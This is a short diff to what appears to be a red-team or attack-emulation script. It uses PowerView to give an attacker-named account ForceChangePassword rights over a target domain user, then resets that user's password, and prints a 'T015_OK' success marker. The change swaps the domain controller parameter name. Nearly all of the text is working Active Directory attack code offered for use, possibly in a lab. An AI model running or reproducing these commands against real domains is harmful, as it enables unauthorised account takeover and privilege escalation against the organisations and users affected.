@@ -26,7 +26,7 @@ if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
 $ErrorActionPreference = "Stop";
 $u = "'''"${DOMAIN_ROOT}\${ATTACK_USER}"'''";
 $t = "'''"${TARGET_USER}"'''";
-Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights ForceChangePassword -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
+Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights ForceChangePassword -Server "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
 Set-DomainUserPassword -Identity $t -AccountPassword (ConvertTo-SecureString "'''"${NEW_PWD}"'''" -AsPlainText -Force) -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
 Write-Output "T015_OK: forced password change on $t to temporary password"
 '
